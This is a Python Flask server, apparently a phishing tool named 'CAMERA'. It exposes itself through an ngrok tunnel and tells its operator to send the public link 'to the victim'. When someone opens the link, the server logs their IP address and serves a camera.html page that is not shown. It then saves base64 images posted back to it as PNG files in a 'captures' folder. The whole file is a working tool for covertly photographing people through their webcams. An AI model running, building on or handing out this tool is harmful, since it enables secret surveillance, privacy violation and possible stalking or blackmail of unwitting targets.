from flask import Flask, request, send_file
import base64
import os
import datetime
import sys
from pyngrok import ngrok, conf
from colorama import init, Fore, Style

init()

logo_lines = [
    " _______  _______  _______  _______  _______  ",
    "(  ____ \(  ___  )(       )(  ____ \(  ____ )(  ___  )",
    "| (    \/| (   ) || () () || (    \/| (    )|| (   ) |",
    "| |      | (___) || || || || (__    | (____)|| (___) |",
    "| |      |  ___  || |(_)| ||  __)   |     __)|  ___  |",
    "| |      | (   ) || |   | || (      | (\ (   | (   ) |",
    "| (____/\| )   ( || )   ( || (____/\| ) \ \__| )   ( |",
    "(_______/|/     \||/     \|(_______/|/   \__/|/     \|"
]

print("\n")
for line in logo_lines:
    part1 = line[:27]
    part2 = line[27:]
    print(f"{Fore.GREEN}{part1}{Fore.BLUE}{part2}{Style.RESET_ALL}")
print("\n")

# --- CONFIG ---
PORT = 5000

# Prompt user for ngrok authtoken
print(f"{Fore.YELLOW}Enter your ngrok authtoken (get it from https://dashboard.ngrok.com/get-started/your-authtoken):{Style.RESET_ALL}")
authtoken = input("Authtoken: ").strip()

if authtoken:
    ngrok.set_auth_token(authtoken)
else:
    print(f"{Fore.RED}No authtoken provided. Dealing with potential errors...{Style.RESET_ALL}")

# --------------

app = Flask(__name__)

# Ensure captures directory exists
CAPTURES_DIR = 'captures'
if not os.path.exists(CAPTURES_DIR):
    os.makedirs(CAPTURES_DIR)

@app.route('/')
def index():
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"--------------------------------------------------")
    print(f"{Fore.GREEN}[+] Target Opened the Link! IP: {ip_addr}{Style.RESET_ALL}")
    print(f"--------------------------------------------------")
    return send_file('camera.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        image_data = data['image']
        
        if 'base64,' in image_data:
            image_data = image_data.split('base64,')[1]
            
        image_bytes = base64.b64decode(image_data)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{CAPTURES_DIR}/capture_{timestamp}.png"
        
        with open(filename, "wb") as f:
            f.write(image_bytes)
            
        print(f"Captured saved to {filename}")
        return {"status": "success", "file": filename}, 200
    except Exception as e:
        print(f"Error saving image: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    print("----------------------------------------------------------------")
    print("Starting Camera Server...")

    # Force kill any previous ngrok sessions to avoid ERR_NGROK_108
    print(f"{Fore.YELLOW}[*] Cleaning up old ngrok sessions...{Style.RESET_ALL}")
    ngrok.kill()
    
    try:
        # Open a ngrok tunnel to the HTTP server
        public_url = ngrok.connect(PORT).public_url
        print(f" * Public URL: {Fore.GREEN}{public_url}{Style.RESET_ALL}")
        print("   (Send this link to the victim)")
        print("----------------------------------------------------------------")
    except Exception as e:
        print(f"{Fore.RED}Error starting ngrok: {e}{Style.RESET_ALL}")
        print("Make sure you have an internet connection.")

    try:
        app.run(port=PORT, debug=False) # debug=False to avoid reloader issues with ngrok
    except KeyboardInterrupt:
        print("Shutting down...")
        ngrok.kill()
        sys.exit(0)
